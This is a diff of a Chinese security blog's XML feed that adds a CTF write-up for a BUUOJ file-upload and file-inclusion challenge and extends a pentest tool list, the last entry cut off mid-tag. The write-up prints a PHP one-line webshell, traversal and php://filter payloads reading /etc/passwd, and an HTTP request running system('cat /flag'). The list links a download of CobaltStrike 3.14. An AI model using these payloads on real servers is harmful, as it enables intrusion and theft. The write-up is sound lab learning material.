@@ -4,6 +4,35 @@
   
     
     <entry>
+      <title>web-buuoj-(BUU UPLOAD COURSE 1)</title>
+      <link href="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/"/>
+      <url>/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="一、题面"><a href="#一、题面" class="headerlink" title="一、题面"></a>一、题面</h1><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2019.35.12.png" style="zoom:60%;"><ul><li><p>查询参数中有个<code>file</code>-&gt;可以尝试测试文件包含漏洞。</p></li><li><p>文件上传功能-&gt;可以测试文件上传漏洞</p></li></ul><h1 id="二、分析"><a href="#二、分析" class="headerlink" title="二、分析"></a>二、分析</h1><h2 id="2-1-测试文件包含漏洞"><a href="#2-1-测试文件包含漏洞" class="headerlink" title="2.1 测试文件包含漏洞"></a>2.1 测试文件包含漏洞</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">file</span><span class="token operator">=</span>index.php<span class="token assign-left variable">file</span><span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd<span class="token assign-left variable">file</span><span class="token operator">=</span>php://filter/read<span class="token operator">=</span>convert.base64-encode/resource<span class="token operator">=</span>/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2019.36.40.png" style="zoom:50%;"><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2019.37.59.png" style="zoom:50%;"><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2019.39.47.png" style="zoom:50%;"><p>貌似做了白名单限制，提供啥参数都是一样的响应。</p><h2 id="2-2-测试文件上传漏洞"><a href="#2-2-测试文件上传漏洞" class="headerlink" title="2.2 测试文件上传漏洞"></a>2.2 测试文件上传漏洞</h2><ul><li>yjh.php</li></ul><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'sxk'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2019.41.38.png" style="zoom:50%;"><p>抓包：</p><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2019.43.00.png" style="zoom:50%;"><p>能上传成功说明没有检测MIME类型、没有检测文件内容。</p><p>但是文件名被改成了jpg后缀，且后缀名是知道的。</p><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2019.44.57.png" style="zoom:50%;"><p>另存图片检查一下内容，看看是否做了二次渲染：</p><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2019.46.27.png" style="zoom:50%;"><p>010editor打开之后发现内容并没有变，还是一句话木马的内容，说明只是替换了后缀，如果存在文件包含漏洞，那么木马就可以被解析执行。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://5006359e-0a16-4718-80cc-1440129facf4.node5.buuoj.cn:81/index.php?file<span class="token operator">=</span>uploads/67b472303fc1a.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2019.49.41.png" style="zoom:50%;"><p>修改路径尝试：</p><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2019.50.30.png" style="zoom:50%;"><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2019.51.19.png" style="zoom:50%;"><p>测试<code>upload.php</code></p><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2019.54.33.png" style="zoom:50%;"><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2019.55.34.png" style="zoom:40%;"><p>upload.php文件返回的内容跟<code>index.php?file=upload.php</code>相同。</p><p>现在的问题是：木马已经上传成功了，但是后缀名是jpg，需要借助解析漏洞实现利用。</p><p>想到上传.htaccess文件。</p><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2020.00.25.png" style="zoom:50%;"><p>但还是被改成了jpg后缀。</p><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2020.01.35.png" style="zoom:50%;"><p>上传user.ini也是。</p><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2020.02.24.png" style="zoom:50%;"><p>随便改个后缀呢？也被改成jpg了。。。</p><p>尝试<code>. 、.空格.、 空格</code>都被改成了jpg。</p><p>但是解析漏洞又没办法用。但推测肯定是通过文件包含漏洞来执行脚本的。</p><h2 id="2-3-结合文件包含漏洞实现命令执行"><a href="#2-3-结合文件包含漏洞实现命令执行" class="headerlink" title="2.3 结合文件包含漏洞实现命令执行"></a>2.3 结合文件包含漏洞实现命令执行</h2><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2020.11.19.png" style="zoom:50%;"><p>修改为POST请求，添加<code>content-type</code>（必须）：</p><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2020.14.13.png" style="zoom:50%;"><p>命令执行成功。</p><h1 id="三、解题"><a href="#三、解题" class="headerlink" title="三、解题"></a>三、解题</h1><h2 id="2-1-请求包构建"><a href="#2-1-请求包构建" class="headerlink" title="2.1 请求包构建"></a>2.1 请求包构建</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /index.php?file<span class="token operator">=</span>uploads/67b472303fc1a.jpg HTTP/1.1Host: 5006359e-0a16-4718-80cc-1440129facf4.node5.buuoj.cn:81Upgrade-Insecure-Requests: <span class="token number">1</span>User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Macintosh<span class="token punctuation">;</span> Intel Mac OS X 10_15_7<span class="token punctuation">)</span> AppleWebKit/537.36 <span class="token punctuation">(</span>KHTML, like Gecko<span class="token punctuation">)</span> Chrome/133.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>,image/avif,image/webp,image/apng,*/*<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.8</span>,application/signed-exchange<span class="token punctuation">;</span><span class="token assign-left variable">v</span><span class="token operator">=</span>b3<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.7</span>Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh<span class="token punctuation">;</span><span class="token assign-left variable">q</span><span class="token operator">=</span><span class="token number">0.9</span>content-type: application/x-www-form-urlencoded<span class="token assign-left variable">sxk</span><span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>精简之后：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">POST /index.php?file<span class="token operator">=</span>uploads/67b472303fc1a.jpg HTTP/1.1Host: 5006359e-0a16-4718-80cc-1440129facf4.node5.buuoj.cn:81content-type: application/x-www-form-urlencoded<span class="token assign-left variable">sxk</span><span class="token operator">=</span>system<span class="token punctuation">(</span><span class="token string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2020.17.24.png" style="zoom:50%;"><h2 id="2-3-antsword-getshell"><a href="#2-3-antsword-getshell" class="headerlink" title="2.3 antsword getshell"></a>2.3 antsword getshell</h2><p>之前被页面回显的<code>你不老实哦~</code>骗了，其实木马在包含时已经被执行了。</p><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2020.22.58.png" style="zoom:50%;"><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2020.19.05.png" style="zoom:50%;"><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2020.20.39.png" style="zoom:50%;"><p>为了能够直观的看到代码是否被执行，可以额外echo一个字符串，如下图所示：</p><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2020.55.51.png" style="zoom:40%;"><img src="/2025/02/18/ctf-shi-zhan/web-buuoj-buu-upload-course-1/%E6%88%AA%E5%B1%8F2025-02-18%2020.55.15.png" alt="截屏2025-02-18 20.55.15" style="zoom:50%;"><p>如果页面输出了我们定制的字符串，那么就能证明后门脚本已经成功执行。</p><p>路径也要注意，下面的路径没有触发执行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">file</span><span class="token operator">=</span>./uploads/67b4831d1ad92.jpg<span class="token assign-left variable">file</span><span class="token operator">=</span><span class="token punctuation">..</span>/uploads/67b4831d1ad92.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>应该是对<code>./</code>等路径参数做了过滤，所以包含路径的时候也要注意尝试。</p><h2 id="2-2-Flag"><a href="#2-2-Flag" class="headerlink" title="2.2 Flag"></a>2.2 Flag</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">flag<span class="token punctuation">{</span>b269923e-d5a6-4f7f-a8fc-08992895bd21<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文主要考察文件上传漏洞和文件包含漏洞的综合的利用，主要考点包括：1）文件上传漏洞、2）文件包含漏洞（包含图片木马，小trick-脚本插入定制的字符串）</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF实战 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF实战 </tag>
+            
+            <tag> web安全 </tag>
+            
+            <tag> 文件上传 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CobaltStrike</title>
       <link href="/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/"/>
       <url>/2025/02/17/gong-fang-gong-ju-ku/cobaltstrike/</url>
@@ -49,9 +78,9 @@
       
         <tags>
             
-            <tag> web安全 </tag>
-            
             <tag> CTF实战 </tag>
+            
+            <tag> web安全 </tag>
             
             <tag> 代码审计 </tag>
             
@@ -68,7 +97,7 @@
       <link href="/2025/02/14/gong-fang-gong-ju-ku/wu-qi-qing-dan/"/>
       <url>/2025/02/14/gong-fang-gong-ju-ku/wu-qi-qing-dan/</url>
       
-        <content type="html"><![CDATA[<h1 id="一、攻防对抗实战"><a href="#一、攻防对抗实战" class="headerlink" title="一、攻防对抗实战"></a>一、攻防对抗实战</h1><h2 id="1-1-信息收集"><a href="#1-1-信息收集" class="headerlink" title="1.1 信息收集"></a>1.1 信息收集</h2><h3 id="1-1-1-综合资产测绘"><a href="#1-1-1-综合资产测绘" class="headerlink" title="1.1.1 综合资产测绘"></a>1.1.1 综合资产测绘</h3><h4 id="1）被动资产测绘"><a href="#1）被动资产测绘" class="headerlink" title="1）被动资产测绘"></a>1）被动资产测绘</h4><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th><th></th></tr></thead><tbody><tr><td>FOFA</td><td><a href="https://en.fofa.info/">https://en.fofa.info/</a></td><td>9</td><td>被动资产测绘，数量比较全可以下载资产数据文件。</td><td></td><td>domain=”域名”</td><td></td></tr><tr><td>Netcraft</td><td><a href="https://sitereport.netcraft.com/">https://sitereport.netcraft.com/</a></td><td>6</td><td>被动资产测绘，数据不全。</td><td></td><td>http://域名</td><td></td></tr><tr><td>Shodan</td><td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td><td>7</td><td>被动资产测绘</td><td></td><td>完整域名</td><td></td></tr><tr><td>Zoomeye</td><td><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></td><td>8</td><td>被动资产测绘</td><td>又名钟馗之眼</td><td>domain=”域名”</td><td></td></tr><tr><td>Google</td><td><a href="https://www.google.com/">https://www.google.com/</a></td><td>7</td><td>被动资产收集</td><td></td><td>site:”域名”</td><td></td></tr></tbody></table><h4 id="2）主动资产测绘"><a href="#2）主动资产测绘" class="headerlink" title="2）主动资产测绘"></a>2）主动资产测绘</h4><p>以下工具通过主动扫描目标进行资产测绘，会产生大量攻击流量，慎用。</p><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th><th></th></tr></thead><tbody><tr><td>Goby</td><td><a href="https://gobysec.net/">https://gobysec.net/</a></td><td>7</td><td>主动资产测绘</td><td></td><td></td><td></td></tr><tr><td>ARL</td><td><a href="https://github.com/Aabyss-Team/ARL">https://github.com/Aabyss-Team/ARL</a></td><td>8</td><td>主动资产测绘</td><td>灯塔</td><td></td><td></td></tr></tbody></table><h3 id="1-1-2-Whois信息"><a href="#1-1-2-Whois信息" class="headerlink" title="1.1.2 Whois信息"></a>1.1.2 Whois信息</h3><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th><th></th></tr></thead><tbody><tr><td>chinaz</td><td><a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a></td><td>7</td><td>whois信息收集</td><td>有时候信息不全</td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="1-1-3-IP信息"><a href="#1-1-3-IP信息" class="headerlink" title="1.1.3 IP信息"></a>1.1.3 IP信息</h3><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th><th></th></tr></thead><tbody><tr><td>chinaz</td><td><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></td><td>8</td><td>判断是否有CDN</td><td></td><td></td><td></td></tr><tr><td>ip138</td><td><a href="https://site.ip138.com/">https://site.ip138.com/</a></td><td>8</td><td>查询域名对应的ip</td><td></td><td></td><td></td></tr><tr><td>aizhan</td><td><a href="https://www.aizhan.com/">https://www.aizhan.com/</a></td><td>8</td><td>域名/IP综合查询</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="1-1-4-子域名"><a href="#1-1-4-子域名" class="headerlink" title="1.1.4 子域名"></a>1.1.4 子域名</h3><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th><th></th></tr></thead><tbody><tr><td>chinaz</td><td><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></td><td>8</td><td>判断是否有CDN</td><td></td><td></td><td></td></tr><tr><td>ip138</td><td><a href="https://site.ip138.com/">https://site.ip138.com/</a></td><td>8</td><td>查询子域名及ip</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="1-2-边界突破"><a href="#1-2-边界突破" class="headerlink" title="1.2 边界突破"></a>1.2 边界突破</h2><h3 id="1-2-1-端口扫描"><a href="#1-2-1-端口扫描" class="headerlink" title="1.2.1 端口扫描"></a>1.2.1 端口扫描</h3><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th></tr></thead><tbody><tr><td>nmap</td><td><a href="https://nmap.org/">https://nmap.org/</a></td><td>9</td><td>端口扫描，服务识别，操作系统识别</td><td></td><td><code>nmap ip -sV -sC -Pn -T 4 -p-</code></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="1-2-2-目录扫描"><a href="#1-2-2-目录扫描" class="headerlink" title="1.2.2 目录扫描"></a>1.2.2 目录扫描</h3><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th></tr></thead><tbody><tr><td>dirsearch</td><td><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></td><td>9</td><td>目录扫描</td><td>python3.9及以上</td><td><code>python dirsearch.py -u http://172.20.10.2/</code></td></tr><tr><td>URLfinder</td><td><a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a></td><td>7</td><td>URLFinder是一款快速、全面、易用的页面信息提取工具.用于分析页面中的js与url,查找隐藏在其中的敏感信息或未授权api接口。 更偏向于页面信息的深度提取，不是目录扫描。</td><td>go，可以直接下载release版使用</td><td><code>./URLFinder -u http://172.20.10.2/ -s all -m 3 -o res.html</code></td></tr><tr><td>yjdirscan(御剑)</td><td><a href="https://github.com/foryujian/yjdirscan">https://github.com/foryujian/yjdirscan</a></td><td>7</td><td>目录扫描</td><td>win系统</td><td></td></tr></tbody></table><h3 id="1-2-3-webshell管理工具"><a href="#1-2-3-webshell管理工具" class="headerlink" title="1.2.3 webshell管理工具"></a>1.2.3 webshell管理工具</h3><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th></tr></thead><tbody><tr><td>AntSword（蚁剑）</td><td><a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></td><td>9</td><td>webshell管理</td><td></td><td></td></tr><tr><td>Godzilla（哥斯拉）</td><td><a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></td><td>8</td><td>webshell管理</td><td></td><td></td></tr></tbody></table><h3 id="1-2-4-综合工具"><a href="#1-2-4-综合工具" class="headerlink" title="1.2.4 综合工具"></a>1.2.4 综合工具</h3><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th></tr></thead><tbody><tr><td>yakit</td><td><a href="https://yaklang.com/">https://yaklang.com/</a></td><td>9</td><td>单兵工具平台</td><td></td><td></td></tr><tr><td>burpsuite</td><td><a href="https://portswigger.net/burp">https://portswigger.net/burp</a></td><td>9</td><td>单兵工具平台</td><td></td><td></td></tr></tbody></table><h2 id="1-3-内网攻防-综合渗透"><a href="#1-3-内网攻防-综合渗透" class="headerlink" title="1.3 内网攻防/综合渗透"></a>1.3 内网攻防/综合渗透</h2><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th></tr></thead><tbody><tr><td>CobaltStrike 3.14</td><td>链接: <a href="https://pan.baidu.com/s/1AW4nL_cJOsrO64xZQltMZA">https://pan.baidu.com/s/1AW4nL_cJOsrO64xZQltMZA</a> 提取码: yiqp</td><td>9</td><td>综合渗透</td><td>详见本站《CobaltStrike》</td><td></td></tr><tr><td>metasploit framework</td><td>kali内置，<a href="https://www.metasploit.com/">https://www.metasploit.com/</a></td><td>9</td><td>综合渗透</td><td>详见本站《MSF-Metasploit》</td><td></td></tr></tbody></table><h1 id="二、靶场综合渗透实战"><a href="#二、靶场综合渗透实战" class="headerlink" title="二、靶场综合渗透实战"></a>二、靶场综合渗透实战</h1><h1 id="三、漏洞挖掘"><a href="#三、漏洞挖掘" class="headerlink" title="三、漏洞挖掘"></a>三、漏洞挖掘</h1><h1 id="四、CTF实战"><a href="#四、CTF实战" class="headerlink" title="四、CTF实战"></a>四、CTF实战</h1><h2 id="哈希破解工具"><a href="#哈希破解工具" class="headerlink" title="哈希破解工具"></a>哈希破解工具</h2><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th></tr></thead><tbody><tr><td>cmd5</td><td><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></td><td>7</td><td>破解常见的md5值</td><td>有时需要付费</td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="编码转换工具"><a href="#编码转换工具" class="headerlink" title="编码转换工具"></a>编码转换工具</h2><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th></tr></thead><tbody><tr><td>tool.lu</td><td><a href="https://tool.lu/hexconvert/">https://tool.lu/hexconvert/</a></td><td>8</td><td>进制转换</td><td></td><td></td></tr></tbody></table>]]></content>
+        <content type="html"><![CDATA[<h1 id="一、攻防对抗实战"><a href="#一、攻防对抗实战" class="headerlink" title="一、攻防对抗实战"></a>一、攻防对抗实战</h1><h2 id="1-1-信息收集"><a href="#1-1-信息收集" class="headerlink" title="1.1 信息收集"></a>1.1 信息收集</h2><h3 id="1-1-1-综合资产测绘"><a href="#1-1-1-综合资产测绘" class="headerlink" title="1.1.1 综合资产测绘"></a>1.1.1 综合资产测绘</h3><h4 id="1）被动资产测绘"><a href="#1）被动资产测绘" class="headerlink" title="1）被动资产测绘"></a>1）被动资产测绘</h4><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th><th></th></tr></thead><tbody><tr><td>FOFA</td><td><a href="https://en.fofa.info/">https://en.fofa.info/</a></td><td>9</td><td>被动资产测绘，数量比较全可以下载资产数据文件。</td><td></td><td>domain=”域名”</td><td></td></tr><tr><td>Netcraft</td><td><a href="https://sitereport.netcraft.com/">https://sitereport.netcraft.com/</a></td><td>6</td><td>被动资产测绘，数据不全。</td><td></td><td>http://域名</td><td></td></tr><tr><td>Shodan</td><td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td><td>7</td><td>被动资产测绘</td><td></td><td>完整域名</td><td></td></tr><tr><td>Zoomeye</td><td><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></td><td>8</td><td>被动资产测绘</td><td>又名钟馗之眼</td><td>domain=”域名”</td><td></td></tr><tr><td>Google</td><td><a href="https://www.google.com/">https://www.google.com/</a></td><td>7</td><td>被动资产收集</td><td></td><td>site:”域名”</td><td></td></tr></tbody></table><h4 id="2）主动资产测绘"><a href="#2）主动资产测绘" class="headerlink" title="2）主动资产测绘"></a>2）主动资产测绘</h4><p>以下工具通过主动扫描目标进行资产测绘，会产生大量攻击流量，慎用。</p><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th><th></th></tr></thead><tbody><tr><td>Goby</td><td><a href="https://gobysec.net/">https://gobysec.net/</a></td><td>7</td><td>主动资产测绘</td><td></td><td></td><td></td></tr><tr><td>ARL</td><td><a href="https://github.com/Aabyss-Team/ARL">https://github.com/Aabyss-Team/ARL</a></td><td>8</td><td>主动资产测绘</td><td>灯塔</td><td></td><td></td></tr></tbody></table><h3 id="1-1-2-Whois信息"><a href="#1-1-2-Whois信息" class="headerlink" title="1.1.2 Whois信息"></a>1.1.2 Whois信息</h3><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th><th></th></tr></thead><tbody><tr><td>chinaz</td><td><a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a></td><td>7</td><td>whois信息收集</td><td>有时候信息不全</td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="1-1-3-IP信息"><a href="#1-1-3-IP信息" class="headerlink" title="1.1.3 IP信息"></a>1.1.3 IP信息</h3><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th><th></th></tr></thead><tbody><tr><td>chinaz</td><td><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></td><td>8</td><td>判断是否有CDN</td><td></td><td></td><td></td></tr><tr><td>ip138</td><td><a href="https://site.ip138.com/">https://site.ip138.com/</a></td><td>8</td><td>查询域名对应的ip</td><td></td><td></td><td></td></tr><tr><td>aizhan</td><td><a href="https://www.aizhan.com/">https://www.aizhan.com/</a></td><td>8</td><td>域名/IP综合查询</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="1-1-4-子域名"><a href="#1-1-4-子域名" class="headerlink" title="1.1.4 子域名"></a>1.1.4 子域名</h3><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th><th></th></tr></thead><tbody><tr><td>chinaz</td><td><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></td><td>8</td><td>判断是否有CDN</td><td></td><td></td><td></td></tr><tr><td>ip138</td><td><a href="https://site.ip138.com/">https://site.ip138.com/</a></td><td>8</td><td>查询子域名及ip</td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h2 id="1-2-边界突破"><a href="#1-2-边界突破" class="headerlink" title="1.2 边界突破"></a>1.2 边界突破</h2><h3 id="1-2-1-端口扫描"><a href="#1-2-1-端口扫描" class="headerlink" title="1.2.1 端口扫描"></a>1.2.1 端口扫描</h3><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th></tr></thead><tbody><tr><td>nmap</td><td><a href="https://nmap.org/">https://nmap.org/</a></td><td>9</td><td>端口扫描，服务识别，操作系统识别</td><td></td><td><code>nmap ip -sV -sC -Pn -T 4 -p-</code></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="1-2-2-目录扫描"><a href="#1-2-2-目录扫描" class="headerlink" title="1.2.2 目录扫描"></a>1.2.2 目录扫描</h3><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th></tr></thead><tbody><tr><td>dirsearch</td><td><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></td><td>9</td><td>目录扫描</td><td>python3.9及以上</td><td><code>python dirsearch.py -u http://172.20.10.2/</code></td></tr><tr><td>URLfinder</td><td><a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a></td><td>7</td><td>URLFinder是一款快速、全面、易用的页面信息提取工具.用于分析页面中的js与url,查找隐藏在其中的敏感信息或未授权api接口。 更偏向于页面信息的深度提取，不是目录扫描。</td><td>go，可以直接下载release版使用</td><td><code>./URLFinder -u http://172.20.10.2/ -s all -m 3 -o res.html</code></td></tr><tr><td>yjdirscan(御剑)</td><td><a href="https://github.com/foryujian/yjdirscan">https://github.com/foryujian/yjdirscan</a></td><td>7</td><td>目录扫描</td><td>win系统</td><td></td></tr></tbody></table><h3 id="1-2-3-漏洞扫描"><a href="#1-2-3-漏洞扫描" class="headerlink" title="1.2.3 漏洞扫描"></a>1.2.3 漏洞扫描</h3><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th></tr></thead><tbody><tr><td>Struts2VulsScanTools</td><td><a href="https://github.com/abc123info/Struts2VulsScanTools/releases/download/v19.32/Struts2_19.32.jar">https://github.com/abc123info/Struts2VulsScanTools/releases/download/v19.32/Struts2_19.32.jar</a> 【项目地址：<a href="https://github.com/abc123info/Struts2VulsScanTools%E3%80%91">https://github.com/abc123info/Struts2VulsScanTools】</a></td><td>7</td><td>struts漏洞检测</td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="1-2-4-webshell管理工具"><a href="#1-2-4-webshell管理工具" class="headerlink" title="1.2.4 webshell管理工具"></a>1.2.4 webshell管理工具</h3><table><thead><tr><th>工具简称</th><th>地址</th><th>个人推荐指数（满分10）</th><th>功能</th><th>备注</th><th>用法示例</th></tr></thead><tbody><tr><td>AntSword（蚁剑）</td><td><a href="https://github.com/AntSwordProject/antSword">https://github.com/AntSwordProject/antSword</a></td><td>9</td><td>webshell管理</td><td></td><td></td></tr><tr><td>Godzilla（哥斯拉）</td><td><a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></td><td>8</td><td>webshell管理</td><td></td><td></td></tr></tbody></table><h3 id="1-2-5-综合工具"><a 